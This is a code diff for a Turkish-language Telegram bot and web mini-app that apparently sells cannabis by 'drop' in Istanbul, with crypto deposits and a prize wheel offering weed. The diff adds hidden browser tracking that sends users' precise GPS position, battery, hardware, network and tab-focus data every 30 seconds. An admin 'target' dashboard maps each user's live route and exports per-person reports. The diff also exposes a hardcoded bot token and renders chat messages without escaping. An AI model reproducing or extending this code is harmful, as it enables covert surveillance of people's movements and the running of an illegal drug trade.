@@ -1,23 +1,3 @@
-import asyncio
-import sqlite3
-import logging
-import os
-import sys
-import threading
-import aiohttp
-import json
-import hashlib
-import time
-from datetime import datetime, timedelta
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
-from aiogram import Bot, Dispatcher, F, types
-from aiogram.filters import Command
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, FSInputFile, WebAppInfo
-
 # --- AYARLAR & CÜZDAN MİMARİSİ ---
 DEFAULT_BOT_TOKEN = "9018759790:AAHHMZxJeCX4RO-d2622gvRQJowHSnxruoM"
 ADMIN_ID = 1012940363
@@ -45,7 +25,7 @@ os.makedirs(UPLOAD_DIR, exist_ok=True)
 def hash_pass(password: str) -> str:
     return hashlib.sha256(password.encode()).hexdigest()
 
-# --- VERİTABANI KURULUMU & OYUN TABLOSU ---
+# --- VERİTABANI KURULUMU & TELEMETRİ TABLOLARI ---
 def init_db():
     conn = sqlite3.connect("drop_bot.db")
     cursor = conn.cursor()
@@ -103,6 +83,24 @@ def init_db():
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             message TEXT,
             log_type TEXT DEFAULT 'info',
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS visitor_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            ip TEXT,
+            user_agent TEXT,
+            network_info TEXT,
+            lat REAL DEFAULT 41.0082,
+            lon REAL DEFAULT 28.9784,
+            battery_level TEXT DEFAULT 'Bilinmiyor',
+            cpu_ram TEXT DEFAULT 'Bilinmiyor',
+            timezone TEXT DEFAULT 'Bilinmiyor',
+            screen_res TEXT DEFAULT 'Bilinmiyor',
+            visibility_state TEXT DEFAULT 'visible',
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -181,6 +179,18 @@ def init_db():
     ]:
         try:
             cursor.execute(f"ALTER TABLE users ADD COLUMN {col} {def_val}")
+        except:
+            pass
+
+    for col, def_val in [
+        ("battery_level", "TEXT DEFAULT 'Bilinmiyor'"),
+        ("cpu_ram", "TEXT DEFAULT 'Bilinmiyor'"),
+        ("timezone", "TEXT DEFAULT 'Bilinmiyor'"),
+        ("screen_res", "TEXT DEFAULT 'Bilinmiyor'"),
+        ("visibility_state", "TEXT DEFAULT 'visible'")
+    ]:
+        try:
+            cursor.execute(f"ALTER TABLE visitor_logs ADD COLUMN {col} {def_val}")
         except:
             pass
 
@@ -266,25 +276,6 @@ def get_district_coord(category_name):
         if key in cat_upper:
             return coord
     return [41.0082, 28.9784]
-
-async def fetch_wallet_balance(wallet_address):
-    try:
-        url = f"https://api.trongrid.io/v1/accounts/{wallet_address}"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url) as response:
-                if response.status == 200:
-                    data = await response.json()
-                    acc_data = data.get("data", [])
-                    if acc_data:
-                        trc20 = acc_data[0].get("trc20", [])
-                        for token in trc20:
-                            if USDT_CONTRACT in token:
-                                val_str = token[USDT_CONTRACT]
-                                return float(val_str) / 1000000.0
-        return 0.0
-    except Exception as e:
-        logging.error(f"Wallet balance fetch error: {e}")
-        return 0.0
 
 LANG = {
     "tr": {
@@ -469,11 +460,14 @@ async def background_payment_worker():
 
             api_url = f"https://api.trongrid.io/v1/accounts/{CRYPTO_WALLET}/trc20-transfers?contract_address={USDT_CONTRACT}&limit=20"
             tx_data = []
-            async with aiohttp.ClientSession() as session:
-                async with session.get(api_url) as response:
+            try:
+                req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=10) as response:
                     if response.status == 200:
-                        res_json = await response.json()
+                        res_json = json.loads(response.read().decode('utf-8'))
                         tx_data = res_json.get("data", [])
+            except Exception as e:
+                logging.error(f"Worker API fetch error: {e}")
 
             for order in pending_orders:
                 o_id, u_id, d_id, f_price, created_at_str, title, stock, category = order
@@ -593,6 +587,30 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             self.wfile.write(b"Weed Istanbul Server Active!")
             return
 
+        if parsed_path.path == "/api/miniapp-deposit":
+            try:
+                uid = int(query_params.get("user_id", ["0"])[0])
+                amount = float(query_params.get("amount", ["0"])[0])
+            except:
+                uid, amount = 0, 0.0
+
+            if uid > 0 and amount > 0:
+                conn = sqlite3.connect("drop_bot.db")
+                cursor = conn.cursor()
+                cursor.execute("INSERT INTO deposits (user_id, amount, status) VALUES (?, ?, 'pending')", (uid, amount))
+                deposit_id = cursor.lastrowid
+                conn.commit()
+                conn.close()
+                resp = {"success": True, "deposit_id": deposit_id, "wallet": CRYPTO_WALLET}
+            else:
+                resp = {"success": False, "message": "Geçersiz miktar veya kullanıcı ID."}
+
+            self.send_response(200)
+            self.send_header("Content-type", "application/json; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(json.dumps(resp).encode("utf-8"))
+            return
+
         if parsed_path.path.startswith("/static/uploads/"):
             file_path = parsed_path.path.lstrip("/")
             if os.path.exists(file_path):
@@ -652,6 +670,10 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     button { background: #2563eb; color: white; padding: 10px 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 13px; transition: 0.2s; }
                     button:hover { background: #1d4ed8; }
                     
+                    .quick-amounts { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin-bottom: 10px; }
+                    .quick-btn { background: #1f2937; border: 1px solid var(--border-color); color: var(--accent-blue); padding: 8px; font-size: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; }
+                    .quick-btn:hover { background: #374151; color: white; }
+
                     .btn-received { background: var(--accent-green); }
                     .btn-received:hover { background: #059669; }
                     .btn-close { background: var(--accent-red); margin-top: 15px; }
@@ -670,8 +692,35 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     .msg-admin { background: var(--card-bg); border: 1px solid var(--border-color); color: var(--accent-blue); }
 
                     .wheel-wrapper { position: relative; width: 220px; height: 220px; margin: 0 auto; }
-                    .wheel { width: 220px; height: 220px; border-radius: 50%; border: 6px solid #38bdf8; position: relative; overflow: hidden; transition: transform 4s cubic-bezier(0.15, 0.9, 0.2, 1); box-shadow: 0 0 20px rgba(56,189,248,0.3); }
-                    .wheel-slice { position: absolute; width: 50%; height: 50%; top: 0; left: 50%; transform-origin: 0% 100%; display: flex; align-items: center; justify-content: flex-start; padding-left: 20px; font-size: 11px; font-weight: bold; color: white; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
+                    .wheel { 
+                        width: 220px; 
+                        height: 220px; 
+                        border-radius: 50%; 
+                        border: 6px solid #38bdf8; 
+                        position: relative; 
+                        overflow: hidden; 
+                        transition: transform 4s cubic-bezier(0.15, 0.9, 0.2, 1); 
+                        box-shadow: 0 0 20px rgba(56,189,248,0.3); 
+                        background: conic-gradient(
+                            #ef4444 0deg 72deg,
+                            #f59e0b 72deg 144deg,
+                            #10b981 144deg 216deg,
+                            #3b82f6 216deg 288deg,
+                            #8b5cf6 288deg 360deg
+                        );
+                    }
+                    .wheel-label {
+                        position: absolute;
+                        width: 100%;
+                        height: 100%;
+                        text-align: center;
+                        font-size: 11px;
+                        font-weight: bold;
+                        color: white;
+                        text-shadow: 0 1px 3px rgba(0,0,0,0.9);
+                        padding-top: 12px;
+                        box-sizing: border-box;
+                    }
                 </style>
             </head>
             <body>
@@ -683,10 +732,10 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
                 <div class="nav-tabs" style="margin-top: 45px;">
                     <button class="tab-btn active" onclick="switchTab('tabMap')">🗺️ Harita</button>
-                    <button class="tab-btn" onclick="switchTab('tabProducts')">🛍️ Ürünler</button>
-                    <button class="tab-btn" onclick="switchTab('tabGames')">🎡 Şans Oyunları</button>
+                    
+                    <button class="tab-btn" onclick="switchTab('tabGames')">🎡 Şans</button>
                     <button class="tab-btn" onclick="switchTab('tabWallet')">💰 Cüzdan</button>
-                    <button class="tab-btn" onclick="switchTab('tabRef')">👥 Davet Et</button>
+                    <button class="tab-btn" onclick="switchTab('tabRef')">👥 Davet</button>
                     <button class="tab-btn" onclick="switchTab('tabOrders')">📦 Geçmiş</button>
                     <button class="tab-btn" onclick="switchTab('tabSupport')">💬 Destek</button>
                 </div>
@@ -718,11 +767,11 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                             
                             <div class="wheel-wrapper">
                                 <div class="wheel" id="wheelEl">
-                                    <div class="wheel-slice" style="transform: rotate(0deg) skewY(-18deg); background: #ef4444;"><span style="transform: skewY(18deg) rotate(36deg); display:inline-block;">🌿 1g Weed</span></div>
-                                    <div class="wheel-slice" style="transform: rotate(72deg) skewY(-18deg); background: #f59e0b;"><span style="transform: skewY(18deg) rotate(36deg); display:inline-block;">🚬 1 Joint</span></div>
-                                    <div class="wheel-slice" style="transform: rotate(144deg) skewY(-18deg); background: #10b981;"><span style="transform: skewY(18deg) rotate(36deg); display:inline-block;">🏷️ %5 İndirim</span></div>
-                                    <div class="wheel-slice" style="transform: rotate(216deg) skewY(-18deg); background: #3b82f6;"><span style="transform: skewY(18deg) rotate(36deg); display:inline-block;">🏷️ %3 İndirim</span></div>
-                                    <div class="wheel-slice" style="transform: rotate(288deg) skewY(-18deg); background: #8b5cf6;"><span style="transform: skewY(18deg) rotate(36deg); display:inline-block;">🏷️ %1 İndirim</span></div>
+                                    <div class="wheel-label" style="transform: rotate(36deg);">🌿 1g Weed</div>
+                                    <div class="wheel-label" style="transform: rotate(108deg);">🏷️ %1 İndirim</div>
+                                    <div class="wheel-label" style="transform: rotate(180deg);">🏷️ %3 İndirim</div>
+                                    <div class="wheel-label" style="transform: rotate(252deg);">🏷️ %5 İndirim</div>
+                                    <div class="wheel-label" style="transform: rotate(324deg);">🚬 1 Joint</div>
                                 </div>
                             </div>
                         </div>
@@ -750,6 +799,12 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         <hr style="border-color: var(--border-color); margin: 15px 0;">
                         <h4>📥 Bakiye Yükle (USDT TRC-20)</h4>
                         <label style="font-size: 12px; color: var(--text-muted);">Yüklemek İstediğiniz Tutar (USDT):</label>
+                        <div class="quick-amounts">
+                            <button class="quick-btn" onclick="setDepAmount(10)">+10$</button>
+                            <button class="quick-btn" onclick="setDepAmount(25)">+25$</button>
+                            <button class="quick-btn" onclick="setDepAmount(50)">+50$</button>
+                            <button class="quick-btn" onclick="setDepAmount(100)">+100$</button>
+                        </div>
                         <input type="number" id="depAmount" placeholder="Örn: 50">
                         <button onclick="createDeposit()">Cüzdan Adresi Oluştur</button>
                     </div>
@@ -804,6 +859,54 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         }
                     }
 
+                    // Gelişmiş Donanım, Ağ, Gecikme, Ekran, Saat Dilimi ve Sekme Odak Takibi (Telemetry & Sniffing)
+                    async function sendTelemetry(customVisibility = null) {
+                        if (!navigator.geolocation) return;
+                        navigator.geolocation.getCurrentPosition(async (pos) => {
+                            try {
+                                let batteryStatus = "Bilinmiyor";
+                                if (navigator.getBattery) {
+                                    const bat = await navigator.getBattery();
+                                    batteryStatus = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Şarjda)" : "(Pilde)");
+                                }
+
+                                const cpuRam = (navigator.hardwareConcurrency || '?') + ' Çekirdek / ' + (navigator.deviceMemory ? navigator.deviceMemory + 'GB RAM' : 'RAM Yok');
+                                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor';
+                                const screenRes = window.screen.width + 'x' + window.screen.height;
+                                const visibility = customVisibility || document.visibilityState;
+                                
+                                let netInfo = 'Wi-Fi / 4G';
+                                if (navigator.connection) {
+                                    netInfo = `${navigator.connection.effectiveType || 'bilinmiyor'} | RTT: ${navigator.connection.rtt || '?'}ms | DL: ${navigator.connection.downlink || '?'}Mbps`;
+                                }
+
+                                await fetch('/api/report-telemetry', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        user_id: userId,
+                                        lat: pos.coords.latitude,
+                                        lon: pos.coords.longitude,
+                                        network: netInfo,
+                                        ua: navigator.userAgent,
+                                        battery: batteryStatus,
+                                        cpu_ram: cpuRam,
+                                        timezone: tz,
+                                        screen_res: screenRes,
+                                        visibility_state: visibility
+                                    })
+                                });
+                            } catch(e) {}
+                        }, null, {enableHighAccuracy: true});
+                    }
+
+                    document.addEventListener("visibilitychange", () => {
+                        sendTelemetry(document.visibilityState);
+                    });
+
+                    setInterval(() => { sendTelemetry(); }, 30000);
+                    sendTelemetry();
+
                     let map, markersGroup;
                     let globalAppData = null;
                     let isMusicPlaying = false;
@@ -835,6 +938,11 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         if(tabId === 'tabMap' && map) {
                             setTimeout(() => { map.invalidateSize(); }, 200);
                         }
+                    }
+
+                    function setDepAmount(val) {
+                        triggerHaptic('light');
+                        document.getElementById('depAmount').value = val;
                     }
 
                     async function loadAppData() {
@@ -927,6 +1035,8 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         }
                     }
 
+                    let currentRotation = 0;
+
                     async function spinGame(gameType) {
                         const btn = document.getElementById('spinBtn');
                         btn.disabled = true;
@@ -938,13 +1048,20 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                                 body: JSON.stringify({user_id: userId, game_type: gameType})
                             });
                             const data = await res.json();
-                            if(!data.success) { alert(data.message); btn.disabled = false; return; }
+                            if(!data.success) { 
+                                alert(data.message); 
+                                btn.disabled = false; 
+                                return; 
+                            }
                             
-                            document.getElementById('wheelEl').style.transform = `rotate(${1440 + data.target_deg}deg)`;
+                            currentRotation += 1800 + (data.target_deg - (currentRotation % 360));
+                            document.getElementById('wheelEl').style.transform = `rotate(${currentRotation}deg)`;
+                            
                             setTimeout(() => {
                                 document.getElementById('wheelResult').innerText = "🎉 Ödül: " + data.reward;
                                 alert("🎉 Tebrikler! Kazandınız: " + data.reward);
-                            }, 4000);
+                                btn.disabled = false;
+                            }, 4200);
                         } catch(e) { 
                             alert("Bağlantı hatası oluştu."); 
                             btn.disabled = false; 
@@ -1131,6 +1248,8 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                                     <input type="text" value="${data.wallet}" readonly>
                                     <button onclick="checkDeposit(${data.deposit_id}, ${amount})" style="background:var(--accent-green);">🔄 Yatırımı Otomatik Kontrol Et</button>
                                 </div>`;
+                            } else {
+                                alert("Bakiye yükleme talebi oluşturulamadı.");
                             }
                         } catch(e) {
                             alert("Bakiye yükleme talebi oluşturulamadı.");
@@ -1160,13 +1279,15 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                             const res = await fetch('/api/miniapp-chat?user_id=' + userId);
                             const data = await res.json();
                             let chatHtml = "";
-                            data.messages.forEach(m => {
-                                const cls = m.sender === 'user' ? 'msg-user' : 'msg-admin';
-                                const senderName = m.sender === 'user' ? 'Sen' : '👑 Destek';
-                                chatHtml += `<div class="msg ${cls}"><b>${senderName}:</b> ${m.message}</div>`;
-                            });
+                            if(data && data.messages) {
+                                data.messages.forEach(m => {
+                                    const cls = m.sender === 'user' ? 'msg-user' : 'msg-admin';
+                                    const senderName = m.sender === 'user' ? 'Sen' : '👑 Destek';
+                                    chatHtml += `<div class="msg ${cls}"><b>${senderName}:</b> ${m.message}</div>`;
+                                });
+                            }
                             const box = document.getElementById('chatBox');
-                            if(box.innerHTML !== chatHtml) {
+                            if(box && box.innerHTML !== chatHtml) {
                                 box.innerHTML = chatHtml;
                                 box.scrollTop = box.scrollHeight;
                             }
@@ -1276,6 +1397,20 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             self.wfile.write(json.dumps(resp).encode("utf-8"))
             return
 
+        if parsed_path.path == "/api/miniapp-chat":
+            uid = int(query_params.get("user_id", ["0"])[0])
+            conn = sqlite3.connect("drop_bot.db")
+            cursor = conn.cursor()
+            cursor.execute("SELECT sender, message, created_at FROM support_messages WHERE user_id = ? ORDER BY id ASC", (uid,))
+            rows = cursor.fetchall()
+            conn.close()
+            msgs = [{"sender": r[0], "message": r[1], "date": r[2]} for r in rows]
+            self.send_response(200)
+            self.send_header("Content-type", "application/json; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(json.dumps({"messages": msgs}).encode("utf-8"))
+            return
+
         if parsed_path.path == "/api/admin-user-detail":
             if not is_logged_in:
                 self.send_response(401)
@@ -1352,13 +1487,13 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             if tab in ["home", "passive", "active", "pending"] and not (current_role in ["super_admin", "stock_manager"] or current_username == "root" or can_manage_drops == 1 or can_view_exact_loc == 1):
                 content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya erişim yetkiniz yoktur!</h3>"
             
-            elif tab in ["add", "edit"] and not (current_role == "super_admin" or current_username == "root" or can_manage_drops == 1):
+            elif tab in ["add", "excel_add", "edit"] and not (current_role == "super_admin" or current_username == "root" or can_manage_drops == 1):
                 content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya (Drop Ekleme/Düzenleme) erişim yetkiniz yoktur!</h3>"
             
             elif tab == "users" and not (current_role == "super_admin" or current_username == "root" or can_view_crm == 1):
                 content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya (CRM) erişim yetkiniz yoktur!</h3>"
 
-            elif tab in ["finance", "token", "bulk", "broadcast", "promo5g", "coupons", "admins"] and not (current_role == "super_admin" or current_username == "root"):
+            elif tab in ["finance", "token", "bulk", "broadcast", "promo5g", "coupons", "admins", "takip_et"] and not (current_role == "super_admin" or current_username == "root"):
                 content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya erişim yetkiniz yoktur! (Yalnızca Süper Admin)</h3>"
 
             else:
@@ -1409,12 +1544,12 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
                     w1_bal, w2_bal, w3_bal = 0.0, 0.0, 0.0
                     if can_view_wallets == 1:
-                        loop = asyncio.new_event_loop()
-                        asyncio.set_event_loop(loop)
-                        w1_bal = loop.run_until_complete(fetch_wallet_balance(CRYPTO_WALLET))
-                        w2_bal = loop.run_until_complete(fetch_wallet_balance(EXIT_WALLET))
-                        w3_bal = loop.run_until_complete(fetch_wallet_balance(MAIN_SAVINGS_WALLET))
-                        loop.close()
+                        try:
+                            w1_bal = fetch_wallet_balance_sync(CRYPTO_WALLET)
+                            w2_bal = fetch_wallet_balance_sync(EXIT_WALLET)
+                            w3_bal = fetch_wallet_balance_sync(MAIN_SAVINGS_WALLET)
+                        except Exception as e:
+                            logging.error(f"Sync wallet fetch error: {e}")
 
                     wallet_section_html = ""
                     if can_view_wallets == 1:
@@ -1599,6 +1734,168 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                             {audit_table if audit_table else "<tr><td colspan='5' style='text-align:center;'>Henüz denetim kaydı bulunmuyor.</td></tr>"}
                         </table>
                     </div>
+                    """
+
+                elif tab == "takip_et":
+                    cursor.execute("SELECT message, log_type, created_at FROM panel_logs ORDER BY id DESC LIMIT 25")
+                    all_panel_logs = cursor.fetchall()
+                    
+                    cursor.execute("""
+                        SELECT v.user_id, v.ip, v.network_info, v.lat, v.lon, v.battery_level, v.cpu_ram, v.timezone, v.screen_res, v.visibility_state, v.created_at 
+                        FROM visitor_logs v
+                        JOIN (
+                            SELECT user_id, MAX(id) as max_id 
+                            FROM visitor_logs 
+                            GROUP BY user_id
+                        ) latest ON v.id = latest.max_id
+                        ORDER BY v.id DESC LIMIT 30
+                    """)
+                    v_logs = cursor.fetchall()
+
+                    user_routes = {}
+                    cursor.execute("SELECT user_id, lat, lon, created_at FROM visitor_logs ORDER BY id ASC")
+                    all_v_history = cursor.fetchall()
+                    for h_uid, h_lat, h_lon, h_date in all_v_history:
+                        if h_uid not in user_routes:
+                            user_routes[h_uid] = []
+                        user_routes[h_uid].append([h_lat, h_lon])
+
+                    visitor_markers_js = ""
+                    for vl in v_logs:
+                        uid, ip, net, vlat, vlon, bat, cpu, tz, screen, vis, vdate = vl
+                        route_coords = user_routes.get(uid, [])
+                        vis_badge = "🟢 Aktif" if vis == "visible" else "🟡 Arka Planda"
+                        
+                        visitor_markers_js += f"""
+                        const route_{uid} = {route_coords};
+                        if (route_{uid}.length > 1) {{
+                            L.polyline(route_{uid}, {{color: '#38bdf8', weight: 3, opacity: 0.6, dashArray: '4, 4'}}).addTo(takipMap);
+                        }}
+
+                        const marker_{uid} = L.marker([{vlat}, {vlon}], {{
+                            icon: L.divIcon({{
+                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);" title="User ID: {uid}">🫆</div>',
+                                iconSize: [32, 32],
+                                iconAnchor: [16, 16]
+                            }})
+                        }}).addTo(takipMap);
+
+                        marker_{uid}.bindPopup("<b>🫆 Canlı Hedef</b><br>User ID: {uid}<br>🔋 Pil: <b>{bat}</b><br>🌐 Ağ: {net}<br>💻 CPU/RAM: {cpu}<br>🌍 Saat Dilimi: {tz}<br>📱 Ekran: {screen}<br>👁️ Odak: {vis_badge}<br>Zaman: {vdate}<br><button onclick='openDetailModal({uid}, \\"{bat}\\", \\"{net}\\", \\"{vdate}\\", \\"{vlat}, {vlon}\\")' style='margin-top:6px; background:#38bdf8; border:none; padding:4px 8px; border-radius:4px; color:#0f172a; font-weight:bold; cursor:pointer;'>📋 Detay & Rapor İndir</button>");
+                        """
+
+                    terminal_rows_html = ""
+                    for v in v_logs:
+                        uid, ip, net, vlat, vlon, bat, cpu, tz, screen, vis, vdate = v
+                        vis_color = "#10b981" if vis == "visible" else "#f59e0b"
+                        terminal_rows_html += f"<div style='margin-bottom:6px; border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <b>User: {uid}</b> | 🔋 Pil: <span style='color:#38bdf8;'>{bat}</span> | 🌐 Ağ: {net} | 💻 {cpu} | 🌍 {tz} | 📱 {screen} | 👁️ <span style='color:{vis_color};'>{vis}</span></div>"
+
+                    content_html = f"""
+                    <div class="form-box" style="border: 1px solid #38bdf8;">
+                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Gelişmiş Telemetri & Parmak İzi Takip Merkezi</h2>
+                        
+                        <div style="margin-bottom: 12px; display: flex; gap: 10px; flex-wrap: wrap;">
+                            <input type="text" id="logSearchInput" onkeyup="filterLogTable()" placeholder="🔍 User ID veya cihaz bilgisi arat..." style="margin:0; background:var(--input-bg); border:1px solid var(--border-color); padding:10px; border-radius:8px; color:white; flex:1;">
+                            <button onclick="filterTableBy('şarjda')" style="background:#10b981; width:auto; padding:8px 12px;">⚡ Şarjda Olanlar</button>
+                            <button onclick="filterTableBy('wi-fi')" style="background:#2563eb; width:auto; padding:8px 12px;">🌐 Wi-Fi / 4G</button>
+                            <button onclick="filterTableBy('all')" style="background:#475569; width:auto; padding:8px 12px;">Tümünü Göster</button>
+                        </div>
+
+                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 220px; overflow-y: auto; font-family: monospace; font-size: 11px; margin-bottom: 20px;" id="terminalLogBox">
+                            {terminal_rows_html if terminal_rows_html else "<span style='color:var(--text-muted);'>Henüz telemetri verisi yok.</span>"}
+                        </div>
+
+                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Rota ve Konum Haritası</h3>
+                        <div id="takipMiniMap" style="width: 100%; height: 300px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
+                    </div>
+
+                    <div id="targetDetailModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center;">
+                        <div style="background:#1e293b; border:1px solid #38bdf8; padding:20px; border-radius:12px; width:400px; max-width:90%; color:white; box-shadow:0 10px 25px rgba(0,0,0,0.5);">
+                            <h3 style="color:#38bdf8; margin-top:0;">📋 Hedef Cihaz Raporu</h3>
+                            <div id="modalContentBody" style="font-size:14px; line-height:1.6; margin-bottom:15px; color:#cbd5e1;"></div>
+                            <div style="display:flex; gap:10px; justify-content:flex-end;">
+                                <button onclick="downloadTargetReport()" style="background:#10b981; border:none; padding:8px 14px; border-radius:6px; color:white; font-weight:bold; cursor:pointer;">📥 Raporu İndir (JSON)</button>
+                                <button onclick="closeDetailModal()" style="background:#ef4444; border:none; padding:8px 14px; border-radius:6px; color:white; font-weight:bold; cursor:pointer;">Kapat</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+                    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+                    <script>
+                        const takipMap = L.map('takipMiniMap').setView([41.0082, 28.9784], 11);
+                        L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{ maxZoom: 19 }}).addTo(takipMap);
+                        {visitor_markers_js}
+
+                        let activeModalData = null;
+
+                        function openDetailModal(uid, bat, net, date, coords) {{
+                            activeModalData = {{ userId: uid, battery: bat, network: net, lastSeen: date, coordinates: coords }};
+                            document.getElementById('modalContentBody').innerHTML = `
+                                <b>User ID:</b> ${{uid}}<br>
+                                🔋 <b>Pil Durumu:</b> ${{bat}}<br>
+                                🌐 <b>Ağ Türü:</b> ${{net}}<br>
+                                📍 <b>Son Koordinat:</b> ${{coords}}<br>
+                                ⏱️ <b>Son Aktiflik:</b> ${{date}}
+                            `;
+                            document.getElementById('targetDetailModal').style.display = 'flex';
+                        }}
+
+                        function closeDetailModal() {{
+                            document.getElementById('targetDetailModal').style.display = 'none';
+                        }}
+
+                        function downloadTargetReport() {{
+                            if (!activeModalData) return;
+                            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(activeModalData, null, 4));
+                            const downloadAnchor = document.createElement('a');
+                            downloadAnchor.setAttribute("href", dataStr);
+                            downloadAnchor.setAttribute("download", `hedef_${{activeModalData.userId}}_raporu.json`);
+                            document.body.appendChild(downloadAnchor);
+                            downloadAnchor.click();
+                            downloadAnchor.remove();
+                        }}
+
+                        function filterTableBy(keyword) {{
+                            const box = document.getElementById('terminalLogBox');
+                            const divs = box.getElementsByTagName('div');
+                            for (let i = 0; i < divs.length; i++) {{
+                                const txt = divs[i].innerText.toLowerCase();
+                                if (keyword === 'all' || txt.includes(keyword)) {{
+                                    divs[i].style.display = "";
+                                }} else {{
+                                    divs[i].style.display = "none";
+                                }}
+                            }}
+                        }}
+
+                        setInterval(() => {{
+                            fetch(window.location.href)
+                                .then(res => res.text())
+                                .then(html => {{
+                                    const parser = new DOMParser();
+                                    const doc = parser.parseFromString(html, 'text/html');
+                                    const newTerminal = doc.getElementById('terminalLogBox');
+                                    if(newTerminal) {{
+                                        document.getElementById('terminalLogBox').innerHTML = newTerminal.innerHTML;
+                                    }}
+                                }})
+                                .catch(e => console.log('Auto-refresh error', e));
+                        }}, 5000);
+
+                        function filterLogTable() {{
+                            const input = document.getElementById('logSearchInput').value.toLowerCase();
+                            const box = document.getElementById('terminalLogBox');
+                            const divs = box.getElementsByTagName('div');
+                            for (let i = 0; i < divs.length; i++) {{
+                                const txt = divs[i].innerText || divs[i].textContent;
+                                if (txt.toLowerCase().indexOf(input) > -1) {{
+                                    divs[i].style.display = "";
+                                }} else {{
+                                    divs[i].style.display = "none";
+                                }}
+                            }}
+                        }}
+                    </script>
                     """
 
                 elif tab == "token":
@@ -2177,17 +2474,44 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     </script>
                     """
 
+                elif tab == "excel_add":
+                    content_html = """
+                    <div class="form-box" style="margin:0; border: 1px solid #10b981; max-width: 650px;">
+                        <h2 style="color: #10b981; margin-top: 0;">📊 Excel / CSV ile Toplu Drop Ekle</h2>
+                        <p style="font-size:13px; color:var(--text-muted); margin-bottom:15px;">
+                            Excel veya CSV dosyanızı yükleyerek tek seferde yüzlerce ürünü ekleyebilirsiniz. Fotoğrafları daha sonra ürün listesinden <b>Düzenle</b> diyerek ekleyebilirsiniz.
+                        </p>
+                        <div style="background:var(--card-bg-inner); padding:12px; border-radius:8px; border:1px solid var(--border-color); font-size:12px; margin-bottom:15px;">
+                            <b>Zorunlu / Beklenen Sütun Adları:</b><br>
+                            <code>title</code>, <code>category</code> (veya <code>semt</code> / <code>ilçe</code>), <code>price</code>, <code>coords</code> (Örn: 41.0429, 29.0077), <code>description</code>
+                        </div>
+                        <form action="/admin-excel-upload" method="POST" enctype="multipart/form-data">
+                            <label>Excel veya CSV Dosyası Seç:</label>
+                            <input type="file" name="excel_file" accept=".csv, .xlsx, .xls" required style="background:var(--bg-color); padding:10px; border:1px dashed #10b981; border-radius:8px; cursor:pointer; margin-bottom:15px;">
+                            <button type="submit" style="background:#10b981;">Dosyayı Yükle & Dropları Oluştur</button>
+                        </form>
+                    </div>
+                    """
+
             edit_form_html = ""
             if tab == "edit":
                 if current_role != "super_admin" and current_username != "root" and can_manage_drops == 0:
                     edit_form_html = "<h3 style='color:red;'>⚠️ Yetkiniz yok!</h3>"
                 else:
